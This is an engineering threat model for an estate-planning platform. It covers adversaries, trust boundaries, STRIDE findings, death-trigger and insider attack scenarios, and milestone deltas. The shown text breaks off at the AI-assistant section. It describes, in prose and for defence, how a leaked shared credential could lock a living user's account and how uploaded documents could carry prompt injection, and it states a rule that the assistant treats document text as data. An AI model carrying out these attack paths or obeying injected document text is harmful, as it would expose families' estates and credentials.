# Estate Planning Platform — Threat Model

**Version:** 1.0 · Methodology: STRIDE per trust boundary + attacker-goal analysis, mapped to NIST 800-53 control families. This document is a living artifact; every new feature PR that crosses a trust boundary requires a threat-model delta.

---

## 1. What makes this platform's threat profile unusual

Most fintech threat models optimize for "attacker steals money today." This platform has three additional properties that reshape the model:

1. **It is a treasure map.** A single account enumerates every asset a family owns, where it is, what it's worth, who inherits it, and — via the vault — the credentials to reach it. Compromise value per account is far higher than a bank login.
2. **Death is a state transition with privileges attached.** The settlement workflow deliberately transfers access to third parties upon death. Any workflow that grants access on death can be attacked by *faking death* or by *being an insider to a real death* (the grieving-family window is a social-engineering goldmine).
3. **Authorized users are potential adversaries.** Trustees, executors, caregivers, and family members hold legitimate grants and also commit a large share of real-world elder financial abuse. The threat model must treat *granted* access as a monitored surface, not a solved problem.

## 2. Adversaries

| Adversary | Capability | Primary goals |
|---|---|---|
| Nation-state / APT | 0-days, supply chain, long dwell | Bulk PII, HNW-individual targeting, persistence |
| Organized crime | Credential stuffing, SIM swap, phishing kits, ransomware | Vault contents, asset intel for fraud, extortion |
| Malicious insider (platform) | Legitimate infra/DB access | Bulk decryption, audit tampering, targeted snooping |
| Malicious insider (estate) | Legitimate role grants | Over-broad access, premature settlement, distribution fraud |
| Opportunist / abusive family member | Owner's devices, shared knowledge, coercion | Account takeover of elderly users, beneficiary manipulation |
| Curious/negligent third-party pro | Attorney/CPA portal access | Data overexposure, credential mishandling |
| Automated/AI-driven attacker | Scaled spearphishing, voice cloning of "the deceased's lawyer" | Settlement-phase social engineering |

## 3. Trust boundaries

TB1: Internet → Edge (CloudFront/WAF/API GW) · TB2: Edge → Services (authn/z) · TB3: Service ↔ Service (mesh) · TB4: Services → Data stores · TB5: Platform → Third parties (Plaid, LLM providers, death-data providers, notification carriers) · TB6: Client device (Zone A crypto happens here) · TB7: Human operators → Production · TB8: Role-holders → Owner's estate data · TB9: Vault extension ↔ arbitrary web pages (added by M16).

TB9 is genuinely new rather than a subdivision of TB6. TB6 is the client DEVICE, whose adversary is malware or injected script on a surface we serve. TB9's adversary is an arbitrary PAGE the user visits — code we did not write, on an origin we do not control, reached over a channel (an extension that can read and write that page's DOM) which did not exist before M16. The two fail differently: TB6 is defended by the isolated origin, its CSP and its empty dependency tree, none of which apply to a page, while TB9 is defended by origin matching, a gesture requirement and a permission set. See §6j.

## 4. STRIDE highlights per boundary (top findings, not exhaustive)

**TB1/TB2 — Edge & AuthN**
- *Spoofing:* Credential stuffing and SIM-swap-based recovery abuse. → Passkey-first, SMS never sufficient alone, breach-corpus password checks, per-account **and best-effort per-address** rate limits (M17 PR1 — **per-IP is NOT built**: identity has no client IP, neither public edge forwards one, and edge limiting is blocked on the M5 cloud half; see §6k), device binding.
- *DoS:* Shield Advanced + autoscaling + per-tenant load shedding; settlement endpoints get separate quotas so an attack can't mask fraud attempts in noise.
- *Info disclosure:* GraphQL introspection off in prod; persisted queries only; error responses genericized.

**TB4 — Data stores**
- *Tampering:* Audit chain hash-anchored to WORM storage; DB roles cannot UPDATE/DELETE event tables; nightly chain verification with paging on gap.
- *Info disclosure:* Bulk-decryption detection — per-principal decrypt-rate baselines with hard circuit breakers. DETECTION SHIPPED IN M18 (§6q) and its signal is the `crypto.field.decrypted` audit stream, NOT KMS telemetry: every Zone B decrypt emits fail-closed before plaintext is released, while the 5-minute DEK cache means N reads under a hot key are N audit events and ZERO KMS operations — KMS-side monitoring structurally cannot see read volume, in the cloud exactly as locally. Bounds are fixed reviewed constants set from measured ceilings (never a learned baseline an attacker could train, and never the old "normal × 50" formula). ENFORCEMENT — suspending the KMS grant, paging a security operator — remains cloud-blocked (real IAM, TB7): the grant is still the RESPONSE chokepoint, but it was never the detection signal.
- *Elevation:* IRSA-scoped pod identities; no shared DB users; RLS as a second net under application authz.

**TB5 — Third parties**
- *Plaid token theft:* Access tokens decryptable only inside the sync worker's isolated namespace; tokens are per-item revocable; webhook signatures verified; anomalous sync patterns alert.
- *LLM data leakage:* Privacy proxy tokenizes names/SSNs/account numbers before provider calls; zero-retention contracts; per-feature consent; prompt-injection defense for any AI feature that reads user-uploaded documents (uploaded doc content is untrusted input — the assistant must never treat document text as instructions, and tool scopes for the assistant are read-only).
- *Death-data providers:* Treated as *signals*, never triggers. See §5.1.
- *Supply chain:* Pinned digests, SBOM + SLSA provenance, cosign verification at admission, dependency review gates, vendored critical libs, no postinstall scripts in CI.

**TB6 — Client**
- *Vault key theft via malware/XSS:* Strict CSP, Trusted Types, no third-party scripts on vault surfaces, WebCrypto non-extractable keys where platform allows, memory zeroization best-effort, clipboard auto-clear, re-auth on vault open.
- *Coercion/shoulder-surfing of elderly users:* Optional "trusted-contact review" mode where high-risk changes (new beneficiary + address change + export within 24h) trigger a notification hold.

**TB9 — Vault extension ↔ arbitrary web pages** (M16)
- *Filling the wrong origin (credential exfiltration):* This is the boundary's defining failure, because a filled credential belongs to the page that received it — the isolated world protects the extension's variables, not the DOM value, so the origin decision IS the disclosure decision. → Registrable domain via a vendored, digest-pinned Public Suffix List snapshot (never a substring, never label stripping); scheme binding, so an `https`-saved credential is never offered on `http`; THE FILL TOUCHES THE TOP FRAME AND NOTHING ELSE — which is narrower than this
section originally described, and the narrowing is the result of measuring the platform in Chrome 151 rather than reasoning about it. The old text promised "cross-origin iframes refused by default with a per-item opt-in", and both halves turned out to be wrong. `activeTab` grants exactly the main frame's ORIGIN, host-exact, so a same-site subframe on a different host (`pay.example.com` under `example.com`) is refused by Chrome outright; PR3a's `frameIsAllowed` would have computed "allowed" for a frame the fill could only ever fail on. And the per-item opt-in CANNOT BE BUILT on `activeTab` at all: honouring it needs host permissions for the third-party origin (`optional_host_permissions` plus a runtime `chrome.permissions.request()`), a manifest key and a consent surface this milestone does not have. `frameIsAllowed` IS DELETED rather than kept, because wiring it showed it can have no caller: the popup cannot enumerate frames (that needs `webNavigation` or `tabs`, deliberately not held), and the injected function cannot import it (`func` is serialized). A rule with nowhere to run is the M4 zero-callers shape. What replaces it is stronger than a rule of ours — THE PLATFORM ENFORCES IT, and refuses an injection into any frame the grant does not cover. **Accepted cost, stated rather than hidden:** a login form inside an iframe is not filled, including a same-origin one, because the extension cannot name the frame without a permission it refuses to hold. confusable domains REFUSED rather than warned about. **Confusable detection is PARTIAL as shipped, and NARROWER after the M16 PR5 review than PR3a claimed.** Caught: an ASCII homoglyph skeleton (`rn`/`m`, `vv`/`w`, `cl`/`d`, digit-for-letter) and edit-distance-1. **Punycode is no longer flagged as confusable at all**, and removing it made the control stronger rather than weaker. The old rule returned `confusable` whenever EITHER side carried an `xn--` label, without comparing the two — so it was not a comparison, and on any internationalised page every saved item matched it. Because `matchesFor` keeps confusable verdicts and drops only `no-match`, the measured effect was that ONE VISIT TO ANY IDN PAGE returned the WHOLE VAULT from the key holder — every title and every saved registrable domain — which is exactly the disclosure `matchesFor` exists to prevent. It also fired the lookalike refusal, the one phishing bound this section commits to, on every item at once on ordinary pages. Nothing was given up: filling requires the registrable domains to be EQUAL, so a punycode host that is not the saved domain was already unfillable and the clause only decided the LABEL on the refusal. The general Unicode confusable case (including a genuine punycode homograph) needs UTS #39 skeletons over a vendored confusables table plus punycode decoding, and remains a named follow-up. A miss is a `no-match`, so it is still REFUSED for filling — what is lost is the explanation, never the boundary. What replaces the per-item claim is a single page-level notice when the page's own registrable domain is internationalised.
- *A hostile page inducing a fill:* → The content script is structurally unable to REQUEST a credential — its message union carries no such variant and it cannot import the key holder. A fill is a one-shot injection into a named frame at the moment of a gesture in extension-owned UI, so there is no standing channel a page can address. **THE EXTENSION NEVER SUBMITS, AND THAT IS NOT THE SAME AS "NOTHING IS EVER AUTO-SUBMITTED"** — which is what this sentence used to say, and the M16 review measured the difference. A fill must dispatch `input` and `change` or no field notices the value, and the reasoning that withholds `blur` ("a page is free to submit on blur, so dispatching one would be auto-submission by proxy") is true of those verbatim: a jsdom probe against the real module showed a page's `change` listener holding the real secret. There is no fix, because the events ARE the fill; what M16 PR5 changed is ORDER — the username is written before the password, so a page that commits early can no longer get the secret with the username field still empty, which is what it used to get. The on-screen copy no longer asserts "Nothing was submitted" either; it says what Estate did and points the user at the address. Also narrowed: the fill's origin decision is now re-read AT THE GESTURE. It used to run on a page URL captured when the popup rendered, so the key holder's re-decision — documented as defending against "the page navigating between the two calls" — compared the same stale string twice and could not see a navigation at all; what actually stood in the way was Chromium revoking `activeTab`, which nobody measured and no test asserted.
- *A hostile page reading the vault by breadth of access:* → `activeTab` + `scripting` only, with no declared content scripts, so the extension has no view of any page until the user clicks it — and any later broadening is a required-permission increase the browser surfaces as re-consent.
- *Compromised store update (the boundary's un-detectable case):* An auto-updated signed artifact has no CSP in its path, and a self-check is written by the same artifact. → Blast-radius reduction first (an `extension` session audience admitted per handler, so it cannot destroy the VAULT — narrowed in M16 PR4a, which admitted `createItem` and `updateItem`: `reset`, both keyset routes and all eleven emergency routes stay refused, so the keyset survives and the vault still opens, but an unlocked extension can overwrite every ITEM with bytes that are not ciphertext and each one becomes permanently unreadable. `vault_items_versions` holds the prior image and NO PRODUCTION CODE READS IT, so recovery today means an operator with psql. The mitigation and the residual below describe the same moment — an unlocked vault — and this clause used to overclaim against it), permissions pinned as data, reproducible builds, published SLSA provenance, and a third-party-runnable verification procedure. *Residual, accepted and stated:* an update keeping the same permissions exfiltrates everything the user unlocks and the platform cannot detect it.
- *Phishing:* Autofill does not resist it. A credential saved at a lookalike is filled at that lookalike. Passkeys are the structural answer and shipped for the web app in M17 PR5 (§6o; the vault origin and extension remain TOTP-only); the refusal above is the bound M16 owes, and with `activeTab` it fires when the user opens the extension, not when they land on the page.

**TB7 — Operators**
- No standing prod access; JIT elevation with peer approval and session recording; all operator reads of user data are themselves audit events surfaced to the user ("Anthropic-style" transparency: users can see that support accessed X on date Y); separation of duties between deploy, data, and key administration.

## 5. Platform-specific attack scenarios (the ones generic checklists miss)

### 5.1 Fraudulent death trigger ("kill them on paper")
**Attack:** Adversary (often a would-be heir or an account-takeover attacker who wants executor-level access) reports the owner dead with a forged certificate or exploits a false-positive from a death-data provider.
**Controls:** (1) No automated trigger from any single source — provider matches only open a *case*. (2) Mandatory human review of certified evidence. (3) Waiting period (default 5 days, configurable up) during which the platform aggressively attempts owner contact through every channel including hardware-key challenge; any owner sign-in with step-up MFA instantly voids the case and flags the reporter. (4) Account enters `deceased_pending` — reads freeze for role-holders; nothing unlocks early. (5) Executor access post-verification is *staged*: inventory first, vault emergency-access last, each stage separately approved. (6) The reporter's identity is verified and recorded; fraudulent reports are preserved for law enforcement.

### 5.2 Emergency-access abuse
**Attack:** A designated emergency contact invokes vault access while the owner is alive but unaware (hospitalized, traveling, cognitively declining).
**Controls:** Waiting period ≥ 24h (owner-configurable), multi-channel owner notification with one-tap deny, optional M-of-N Shamir requirement so no single contact can unlock alone, full audit visible to owner afterward, and scope limits (contacts can be granted vault subsets, not all-or-nothing).

### 5.3 Insider bulk decryption
**Attack:** Platform engineer or compromised service identity attempts mass read of SSNs/documents.
**Controls:** Every released plaintext is one fail-closed `crypto.field.decrypted` event, and the M18 detector (§4 TB4, §6q) alarms on per-principal windowed counts over reviewed bounds — the DEK cache means bulk READS are not bulk KMS operations, so the audit stream, not KMS, is what sees them. Per-user DEKs still mean bulk access across many users requires bulk KMS unwraps (rate-limited and circuit-broken at the grant — the enforcement half, cloud-blocked); CloudHSM roots mean even AWS-level compromise can't silently exfiltrate key material; canary records (fake users with tripwire fields) page on any access.

### 5.4 Grief-window social engineering
**Attack:** After a real death, attackers phish executors/beneficiaries ("probate portal fee required"), possibly with AI voice cloning of the family attorney.
**Controls:** All settlement communication happens in-app only; emails/SMS are content-free pointers by design, and onboarding for role-holders drills this ("we will never link you to a payment page"); executor dashboard shows verified contact cards for the estate's attorney/CPA; distribution approvals are dual-control with step-up MFA.

### 5.5 Beneficiary-conflict information abuse
**Attack:** A beneficiary with read access enumerates other beneficiaries' shares to contest or coerce.
**Controls:** ABAC default — beneficiaries see only assets naming them and only their own designation, unless the owner explicitly opens visibility; access-pattern anomalies (rapid enumeration) alert the owner.

### 5.6 Ransomware / destructive attack
**Attack:** Encrypt-and-extort against databases and object storage.
**Controls:** Immutable, cross-account, Vault-Locked backups the prod account cannot delete; monthly automated restore verification; event-sourced domains can rebuild projections; ransomware-specific runbook with decision tree and pre-negotiated IR retainer; audit chain proves data integrity post-recovery.

## 6. Risk register (top 10)

| # | Risk | L | I | Residual treatment |
|---|---|---|---|---|
| 1 | Account takeover of elderly / low-security users | H | H | Passkey nudges, trusted-contact review mode, adaptive step-up |
| 2 | Fraudulent settlement trigger | M | Critical | §5.1 layered controls; annual red-team of the flow |
| 3 | Insider bulk data access | M | Critical | KMS chokepoint + detection; JIT access; canaries |
| 4 | Vault client-side compromise (XSS/malware) | M | Critical | CSP/Trusted Types; isolated vault origin; bug bounty focus area |
| 5 | Plaid/aggregation token abuse | M | H | Namespace isolation, revocation drills |
| 6 | LLM prompt injection via uploaded docs | H | M | Untrusted-input framing, read-only tools, output filtering |
| 7 | Supply-chain compromise of a dependency | M | H | SLSA, pinning, admission control, egress allowlists |
| 8 | Legal/compliance failure in a state template | M | H | Attorney-gated template releases; per-state execution-requirement engine |
| 9 | Ransomware | M | H | §5.6; RTO 15m / tested restores |
| 10 | Notification-channel phishing of role-holders | H | M | Content-free notifications, in-app-only sensitive comms |

## 6a. Threat-model delta — M6 vault, Zone A (2026-07-27)

This document requires a delta for every feature PR that crosses a trust
boundary. M6 activates **TB6 (client device)** in earnest: until now no code
held keys the server could not derive, and risk #4 (vault client-side
compromise, Critical) described something that did not exist yet.

**Controls now shipped.**
- Keys derive from the vault password AND a 128-bit device-only Secret Key
  (2SKD), so the server-held verifier and wrapped master key are useless to an
  attacker who has the database and a correct password guess. This is the
  control that makes §5.3 (insider bulk decryption) structurally inapplicable to
  Zone A: there is no bulk decryption path, because there is no decryption path.
- The vault password never transits (SRP-6a). Every unlock failure emits
  `vault.open.failed`, which is what makes §4/TB4-style burst detection possible
  for vault access specifically.
- Master and item keys are unwrapped as **non-extractable `CryptoKey`s**, the
  TB6 "non-extractable keys where the platform allows" control — an injected
  script in the vault origin can use them but not read them out.
- `@estate/vault-crypto` has zero runtime dependencies, enforced by lint and by
  a source-scanning test. This is the TB6 supply-chain control: the code holding
  the only keys that open a vault has no transitive tree to compromise.
- The client pins the KDF and SRP parameters the server serves it, so a
  malicious server cannot downgrade the group or the iteration count.
- Step-up MFA gates vault open and all key-material changes, per §5 of the
  architecture doc.

**Residuals accepted, and why.**
- *JS `bigint` is not constant-time.* True of every JavaScript SRP; bounded by
  network jitter, and no code path branches early on a secret comparison.
- *Full-history rollback.* A server that serves an old blob AND claims its old
  version is detectable only by client-side last-seen state. Same class as every
  hosted zero-knowledge store. Per-version AAD binding stops the easier attack:
  replaying a blob at a *different* version fails to decrypt.
- *Reset is token-gated.* A forgotten password cannot be proven, so the reset
  route is the one place step-up-fresh stolen tokens can destroy — never read —
  a vault. Compensating: distinct audit action, step-up freshness, and owner
  notification when the notification port lands.
- *No rate limiting on failed SRP proofs yet.* PARTIALLY closed twice over and
  the remainder is named precisely. M16 capped step-up, which bounds both SRP
  legs transitively because both are step-up gated (§6j); M17 PR1 delivered the
  login bound this bullet was tracked against (§6k). What is still open is
  neither of those: a caller holding a GENUINE step-up can burn handshakes, and
  no bound on the SRP route itself exists. Handshakes burn on attempt in the
  meantime.

**§5.2 emergency-access controls, now shipped (M6 PR2).**
- *Waiting period ≥24h, owner-configurable:* enforced by the platform half of a
  two-level split (`RK = platform_part XOR contacts_part`). Colluding grantees
  hold only the contacts half, which is information-theoretically useless alone,
  so the delay is a cryptographic constraint rather than an honour system.
- *Multi-channel owner notification with one-tap deny:* the notification port
  ships with a stub, and the emergency-access routes **refuse in production**
  while only the stub is wired — a waiting period nobody can be told about is
  not a control. Denial is deliberately the one owner action with no step-up
  requirement, because it must be one tap from a notification.
- *Optional M-of-N:* implemented over GF(2^8), threshold 1 by default.
- *Full audit visible to the owner afterward:* every transition is recorded,
  including refused requests, so a grantee who tried repeatedly is visible.
- *Denial is sticky*, with no time-based cooldown — a cooldown would tell a
  patient grantee how long to wait, and outlasting the owner is the attack.
- *Key substitution* (not in §5.2's list, but the same threat class): shares are
  sealed to a public key the owner confirms out of band by fingerprint, and the
  key each share was sealed to is recorded so a later change is detectable.

**Residual accepted here:** the platform half lives on the server, so a server
that releases it early defeats the waiting period. Inherent to docs/01's design
— a delay enforced by a party is only as good as that party. The split still
guarantees that a database dump alone is insufficient, and that no contact can
act alone.

**Not yet shipped, and therefore not yet mitigated.**
- §5.2's *scope limits* (granting a contact a vault subset) remain deferred;
  per-item keys are in place so it is a later grant feature, not a
  re-architecture.
- §5.1 control 5 — settlement's staged access, with vault emergency access last
  and separately approved — is an **M7 integration point**. The release path
  must consult settlement state once settlement exists.
- The isolated vault origin, CSP, and Trusted Types are frontend controls; no
  vault UI ships in M6, so they land with that surface.

## 6b. Threat-model delta — M7 settlement PR1 (2026-07-27)

M7 activates **TB8 (role-holders → owner's estate data)** in earnest: it is the
first flow where the acting principal is routinely NOT the resource owner, and
the first that deliberately changes another user's account state. §5.1 is the
control specification; this delta records how each control landed.

**Controls now shipped (PR1: intake → review → waiting period → verified).**
- *No automated trigger from any single source (control 1).* Intake only OPENS
  a case. Reporters must already be named by the decedent's contact repository
  (`contacts.linked_user_id`) — no lookup by email or arbitrary id exists, so
  intake cannot enumerate accounts. Death-data provider matches are
  operator-filed signals (`data_provider`), never triggers. One open case per
  decedent (partial unique index).
- *Mandatory human review (control 2).* Operators are ordinary platform users
  on a CLI-managed allowlist (`settlement_operators`; deliberately NO runtime
  grant API — a stolen operator session cannot mint operators). Review
  decisions are step-up-gated; reviewer ≠ reporter is a DDL CHECK plus a row
  check; "no privileged status without recorded review" is a DDL CHECK. The
  reviewing operator can read death-certificate evidence through a dedicated
  documents route whose authority is settlement's answer, cross-checked
  against the document's REAL owner — a reporter registering someone else's
  document id as evidence gets an operator a uniform 404, not a decryption.
- *Waiting period with aggressive owner contact (control 3).* Default 5 days,
  owner-configurable UP to 60 (floor in DDL + schema + service; changes
  refused while a case is open — a pending case's parameters are frozen).
  Escalating contact attempts on a 12h multi-channel schedule, recorded
  append-only. The in-process driver that performs them holds NO transition
  power: timer expiry only makes a case ELIGIBLE; an operator (again never the
  reporter) explicitly confirms, and the confirmation re-checks owner liveness
  against identity's append-only step-up ledger — a step-up newer than the
  case voids it on the spot, restores the account, and flags the reporter.
  That check is enforced TWICE, deliberately: settlement reads liveness before
  asking for the terminal transition, and identity restates the predicate in
  the same single statement as the status write (a `NOT EXISTS` over
  `auth_events` in the CAS `UPDATE`, same cluster, no network hop). Without
  the second one, a step-up landing between settlement's read and its commit
  would be invisible, and — since there is no un-verify ceremony — would
  entomb a living owner in `settlement` irreversibly. The interlock turns that
  race into a refusal (`409 owner_alive`) that voids the case instead.
  The owner's own kill switch is a step-up-gated void route (the step-up IS
  the liveness proof; a bare stolen bearer cannot void).
- *Account enters deceased_pending (control 4).* Cross-service, identity-
  enforced: a closed transition table (active↔deceased_pending→settlement)
  behind a dedicated service credential; identity applies its own invariants
  regardless of what settlement asks. The lock call happens INSIDE the case
  transaction — an unconfirmable lock rolls the transition back. During
  deceased_pending the OWNER's login and sessions stay alive (the rescue
  path) while profile's role-holder contact grants freeze. At verified the
  status becomes `settlement`, every session is revoked, live-token lookups
  fail via a status allowlist in the session SQL, and re-login gets the
  generic 401 with a distinct recorded reason (`account_settled` — decedent-
  credential replay is a detection signal). Post-verified rescue is
  deliberately not self-serve.
- *Reporter identity preserved (control 6).* `reported_by` is a verified
  platform user; rejected and voided cases are terminal rows that are never
  deletable (cases have no soft delete BY DESIGN), with `resolution`
  distinguishing operator rejection from owner void; every audit event on the
  flow preserves the reporter id.

**New trust machinery, flagged.** A static shared service credential
(`ServiceCredentialGuard`, constant-time compare, fail-closed when unwired;
required ≥32 chars in production) authenticates settlement on identity's
internal settlement-lock routes — the one flow with no user bearer token to
forward by construction. Interim until the mesh (mTLS/SPIFFE) provides
verifiable peer identity; the guard is the seam.

**Deliberate deviations.** Temporal is deferred behind a powerless in-process
driver (approved: there is no deployment for its durability to protect; the
DB state machine docs/02 §7 mandates is authoritative either way). Intake and
review-approve REFUSE in production while only the stub notifier is wired
(503, the M6 emergency-access precedent) — a waiting period nobody can be
told about is not a control.

**Control 5 — staged executor access — now shipped (PR2).**
- *Staged, ordered, separately approved.* `inventory → documents → vault`, and
  the order IS the control: an executor may request only the next rung, each
  requires an operator approval, and Zone A is therefore structurally the
  furthest grant from a fresh death report. A requested stage grants nothing.
- *Two people per stage.* The executor requests, an operator approves, and a
  DDL CHECK forbids them being the same person. Executor designation
  (`role_assignments`, the dormant `on_death_verified` half that settlement is
  the first consumer of) grants nothing on its own.
- *§6a closed.* The vault's emergency-access `request` AND `release` now
  consult settlement — twice, once before the waiting clock starts and again
  inside the release transaction after the row lock, because the period is
  days long and an estate can enter settlement in between. A non-terminal case
  without an approved `vault` stage BLOCKS; so does an unreachable settlement,
  since the client fails closed on every path. That direction is deliberate:
  blocking delays a legitimate recovery (the escrow is unspent and releases
  once the stage lands), while allowing hands a fraudulent "heir" the platform
  half of the recovery key inside the very window §5.1 exists to protect.
  Refusals are audited as `vault.emergency.release_blocked` with the case id.
  The gate is authenticated by the SERVICE credential, not the grantee's
  bearer — the question is about the owner's estate, not the caller's rights.
- *Distributions under dual control* (docs/02 §7): the recorder is stamped from
  the verified session at insert, the approver must differ, and a row-local
  CHECK enforces it immediately rather than a trigger (both parties are columns
  of the same row, so a CHECK is stricter — undeferrable and unbypassable).
  Amounts are envelope ciphertext under settlement's own `settlement/kek`, so
  profile's KMS grant cannot read them even sharing the cluster; the plaintext
  never enters a column, a log, or an audit payload.
- *Estate reads are the data owner's decision.* Assets exposes a separate
  executor route that forwards the caller's bearer to settlement and refuses on
  anything short of an explicit allow; settlement itself holds no data-read
  power, so compromising it mis-answers questions rather than exfiltrating an
  estate. Each such read is audited as `asset.estate.viewed` with the decedent
  as `onBehalfOf`.
- *Legal hold* (docs/00 compliance) is now settable — by settlement only,
  through a service-credential internal route, closing the M4 gap where the
  hold was enforced but had no writer.

**Residual added by PR2.** A settlement operator can approve every stage of a
case they did not report, so an insider operator plus a colluding "executor"
designation is a two-party path to an estate. Bounded by: the executor
designation must already exist in the decedent's own contact records (made
before the death), the reporter≠reviewer and requester≠approver rules, the
waiting period and owner-void that precede any of it, and a fully audited
trail. Reducing it further needs M-of-N operator approval, which belongs to
the TB7 operator-platform milestone alongside JIT elevation.

**Residuals accepted.** The liveness interlock narrows the lockout race to a
single statement but cannot erase it: a step-up committing inside that
statement's window is still missed. The blast radius is bounded — after the
transition, sessions are revoked and the status allowlist blocks every session
lookup, so the step-up buys nothing and the attempt is preserved in
`auth_events` for after-the-fact review — and closing it completely would
require the step-up path to take the users row lock, which is the right shape
for the operator-platform milestone rather than a settlement-side fix. A
settlement operator is a high-value target; the
interim allowlist has no JIT elevation or peer approval (TB7 milestone), and
one operator both approves and confirms a case (two actions, one human) —
bounded by reviewer≠reporter, the liveness re-check, the owner's void, and
the append-only audit trail; PR2's stage approvals add multi-party depth.
Rate limiting on intake is STILL OPEN, and M17 PR1 did not close it: that change
bounds identity's own login and register routes (§6k), not settlement's intake,
which authenticates its callers and would need a per-reporter bound of its own.
Per-reporter noise remains bounded by the linked-contact gate and the
one-open-case index.

**Service-credential scoping (added by the M7 security review, 2026-07-28).**
The internal service credentials introduced for the account lock and the §6a
gate are the one M7 mechanism that can bypass §5.1's control chain outright, so
they carry their own rule: **one secret per callee, per direction.** Each
variable is named for the service whose internal routes it OPENS
(`IDENTITY_INTERNAL_TOKEN`, `SETTLEMENT_INTERNAL_TOKEN`,
`DOCUMENTS_INTERNAL_TOKEN`), never for the caller that presents it, and no
value ever authenticates in both directions.

The review found the original design violating this: settlement used one config
field as both its inbound-expected and its outbound-presented value, which
transitively forced identity, settlement, vault and documents onto a single
shared secret. Anyone holding vault's copy — the most exposed service in the
product, and by Zone A design the one that should hold the least authority —
could call `PUT /internal/v1/settlement-lock/{victim}` twice and irreversibly
move a living user to `settlement` status with no case, no operator, no waiting
period and no owner-void window. That is §5.1's Critical outcome reached by
skipping every control above, and it is the sharpest illustration of why the
credential is scoped rather than shared: a static bearer secret confers exactly
the routes it opens, so the blast radius IS the naming discipline.
Settlement's config refuses to boot in production when its two credentials are
equal, because splitting the field does not stop an operator pasting one value
into both slots. Rotation remains a synchronized restart of two services; the
mesh mTLS/SPIFFE follow-up removes the static secret rather than improving it.

## 6c. Threat-model delta — M9 notifications (2026-08-04)

M9 turns the §6a/§6b notification PRECONDITIONS into a running control: the
notifications service (docs/01 §2.10, TB5's carrier boundary) delivers the
owner notifications that the emergency-access and settlement waiting periods
rest on. Controls shipped, each mapped to what this document demanded:

- **Content-free pointers are enforced by construction, not convention
  (§5.4, risk #10).** The wire schema has no text field — a closed kind enum,
  a user id, a requested channel, an optional deadline — so a compromised
  caller can trigger a template, never author a message. The template
  registry carries no user data beyond the deadline DATE, uses ONE uniform
  SUBJECT for every kind, and contains NO links of any kind. The production
  e2e asserts all three properties on a real delivered message.
  SCOPED PRECISELY (M9 security review): the uniform subject means a mailbox
  observer who sees only subject lines cannot tell which control fired, but
  the BODY names it in its first clause ("…asked for emergency access to your
  Estate vault", "A report was filed on your Estate account"). That is
  deliberate — an actionable body is what makes the notification a control
  rather than a curiosity — but it means a lock-screen preview and the
  carrier both learn the EVENT CLASS. See the residual below; the earlier
  claim that an observer "never learns WHICH control fired" was true of the
  subject only and is corrected here.
- **Recipient addresses never cross a cluster boundary (§5.3).** The service
  keeps its own store, AEAD under its own `notifications/kek` (core
  co-tenants cannot unwrap it), fed by identity at the two plaintext moments
  (registration, login). No email-ciphertext read path exists anywhere; no
  blind index exists on the store (nothing legitimate asks "which user has
  this address"). Every send's decrypt is a logged event.
- **The gates stay, and became visible.** The per-route 503s remain as
  defense in depth behind the production adapter pins (`NOTIFY_MODE=http`,
  `EMAIL_MODE=ses`), and now emit `vault.emergency.notifications_refused` /
  `settlement.notifications_refused` — a control firing must be
  distinguishable from an outage in the stream operators watch.
- **The credentials are scoped (§6b's rule), and there are TWO.** Corrected by
  the M9 security review, which found ONE credential opening both surfaces:
  `NOTIFICATIONS_INTERNAL_TOKEN` opens SEND only (holders settlement, vault),
  and `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN` opens the recipient upsert
  and is held by IDENTITY ALONE. The split matters because the two
  capabilities have different blast radii: sending is bounded spam, while
  deciding where a user's notifications GO is the power to silence the §5.1
  contact sweep and the §5.2 waiting-period alerts. Merged, vault's copy
  could silence settlement's death-case alerts and settlement's could silence
  vault's emergency-access alerts — cross-domain, and exactly what one secret
  per callee exists to prevent. Enforced by two guards binding two DI tokens;
  the service refuses to boot in production if the two values are equal, and
  pairwise aliasing refusals extend to both in every holder.

**Residuals, accepted and recorded:**

- *Email is the only live channel.* §5.2's "multi-channel" and §5.1's
  "every channel including hardware-key challenge" remain aspirational;
  the contact trail records channel INTENT (push/sms/voice) while delivery is
  email. SMS/push arrive with their own carriers and their own review.
- *No one-tap deny token yet.* Deny remains an in-app action ("open your
  Estate app"); an email-borne deny capability needs the vault UI's isolated
  origin to exist and its own token design + review. Until then the
  notification shortens discovery time but not the deny path.
- *Repointing an EXISTING user's address needs identity's credential.* Since
  the M9 review's split this is true as written: only
  `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN`, held by identity alone, can
  change where a user's alerts go. (Before the split it was false — vault's
  and settlement's copies sufficed, and this document said otherwise.)
  Recipient changes are versioned and audited, but see the next residual.
- *The recipient-change audit cannot ATTRIBUTE.* `notification.recipient.updated`
  carries `actorId: null`, `actorType: 'service'` and an empty detail, the
  versions trigger stamps the system sentinel, and identity emits the same
  event on EVERY successful login — so the trail proves that an address
  changed and preserves the prior ciphertext, but cannot distinguish a
  legitimate login-time refresh from a malicious repoint. It is evidence for
  after-the-fact recovery, NOT a detection control, and should not be cited
  as one. Closing it means recording the calling service, which the static
  shared-secret model cannot do — it arrives with the mesh's peer identity.
- *Users' addresses are UNVERIFIED.* **CLOSED by M14** — see §6h. The residual
  as it stood: registration performed no ownership proof, identity fed whatever
  the user typed into the delivery store, and `users.email_verified_at` was
  never written or read, so "identity's word" meant the address was TYPED, not
  OWNED. `users.email_verified_at` remains dead schema deliberately; the
  verified bit lives on `notification_recipients`, in the store that would have
  to do the reaching.
- *The carrier sees addresses, timing, AND the event class (TB5).* Inherent
  to email, and wider than previously recorded here: the body names which
  control is running, so SES and the receiving provider get a per-address
  labelled event stream ("this account is in a death-review period"). The
  content-free doctrine bounds this to the event class — never estate
  content, never a name, an asset, a document title or a link — but it does
  not eliminate it. Closing it fully needs an out-of-band or encrypted push
  channel, i.e. the vault UI's isolated origin. SES supply-chain posture
  rides the existing AWS SDK pinning.
- *`emergency.reminder` is declared but never emitted* (vault has no
  scheduler); the sweep-driven reminder belongs with Temporal or a later
  driver.

**The M6 delivery-channel identifier leakage item: PARTIALLY CLOSED.**
Answered by the M9 security pass rather than left owed. Closed, by
construction: no caller-authored text anywhere (the wire has no text field),
no identifiers of any kind in a message (no name, address, asset, document
title, case id, user id or token — the only variable is a date), no links at
all so no per-recipient URL can re-identify a recipient to the carrier, one
subject across all nine kinds, and addresses that never cross a cluster
boundary. Still open, and now recorded above rather than claimed closed: the
EVENT CLASS reaches the carrier and any body-preview observer, and that is
accepted deliberately because an actionable body is what makes the
notification function as a control. Fully closing it is the isolated-origin
push channel, a later milestone.

## 6d. Threat-model delta — M10 AI assistant PR1 (2026-08-04)

The assistant is the first component an attacker can address in **natural
